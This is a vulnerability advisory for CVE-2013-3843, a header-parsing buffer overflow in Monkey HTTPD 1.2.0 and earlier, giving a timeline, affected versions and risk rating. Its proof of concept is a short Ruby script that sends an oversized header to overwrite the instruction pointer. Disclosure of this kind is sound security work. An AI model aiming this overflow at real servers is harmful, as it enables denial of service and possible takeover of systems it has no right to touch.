Subject: CVE-2013-3843  Monkey  HTTPD  1.2.0 - Buffer Overflow DoS
 Vulnerability With Possible Arbitrary Code Execution

1. Title

   CVE-2013-3843  Monkey  HTTPD  1.2.0 - Buffer Overflow DoS
   Vulnerability With Possible Arbitrary Code Execution

2. Introduction

   Monkey is a  lightweight  and  powerful  web  server  for
   GNU/Linux.

   It  has been designed to be very scalable with low memory
   and CPU consumption, the perfect  solution  for  embedded
   devices. Made for ARM, x86 and x64.


3. Abstract

   A  specially  crafted  request  sent  to the Monkey HTTPD
   server triggers a buffer overflow which can  be  used  to
   control the flow of execution.

4. Report Timeline

   2013-05-29
      Discovered vulnerability via fuzzing
   2013-05-30
      Vendor Notification

5. Status

      Published

6. Affected Products

      Monkey HTTPD <= 1.2.0

7. Exploitation Technique

      Remote

8. Details

      Improper  bounds checking while parsing headers allows
      for an attacker to craft a request that will trigger a
      buffer  overflow during a call to memcpy() on line 268
      in the file, mk_request.c.

9. Proof of Concept

      The vulnerability can be exploited by remote  attacker
      without  any  special privileges.  Under Ubuntu 13.04,
      an offset of 2511 lines  up  the  instruction  pointer
      with, 0x42424242.


     #!/usr/bin/env ruby

     require "socket"

     host = "localhost"
     port = 2001

     s = TCPSocket.open(host, port)

     buf = "GET / HTTP/1.1\r\n"
     buf << "Host: " + "\r\n"
     buf << "localhost\r\n"
     buf << "Bad: "
     buf << "A" * 2511
     buf << "B" * 4

      s.puts(buf)


10. Solution

   There is currently no solution.

11. Risk

   Risk should be considered high since it can be shown that
   the flow of execution can be controlled by an attacker.
